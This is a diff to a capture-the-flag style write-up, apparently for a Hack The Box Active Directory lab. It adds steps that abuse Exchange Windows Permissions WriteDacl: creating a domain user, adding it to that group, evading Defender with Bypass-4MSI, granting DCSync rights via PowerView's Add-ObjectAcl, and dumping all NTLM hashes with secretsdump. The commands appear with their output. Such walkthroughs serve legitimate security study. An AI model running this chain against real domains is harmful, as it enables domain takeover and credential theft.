@@ -223,4 +223,27 @@ copy 20230805174246_BloodHound.zip \\10.10.16.5\share\
 through nested membership. Click on 9 to reveal the membership graph.
 - found Account Operators , which is a privileged AD group
 - members of the Account Operators group are allowed create and modify users and add them to non-protected groups. Let's note this and look at the paths to Domain Admins. Click on Queries and select Shortest Path to High Value targets
-- 
+- One of the paths shows that the Exchange Windows Permissions group has WriteDacl privileges on the Domain
+- The WriteDACL privilege gives a user the ability to add ACLs to an object
+- This means that we can add a user to this group and give them DCSync privileges
+- add a new user to Exchange Windows Permissions as well as the Remote Management Users group.
+- ```
+  *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user islam iso12345 /add /domain
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Windows Permissions" islam /add /domain
+The command completed successfully.
+
+  ```
+- download the PowerView script and import it into the current session
+```
+. ./Powerview.ps1
+```
+- The Bypass-4MSI command is used to evade defender before importing the script
+-  Next, we can use the Add-ObjectACL with islam's credentials, and give him DCSync rights
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $SecPassword = ConvertTo-SecureString 'iso12345' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $Cred = New-Object System.Management.Automation.PSCredential('htb\islam', $SecPassword)
+*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> Add-ObjectAcl -PrincipalIdentity islam -Credential $Cred -TargetIdentity htb.local -Rights DCSync
+```
+- run secretsdump.py  script from Impacket can now be run as islam, and used to reveal the NTLM hashes for all domain users
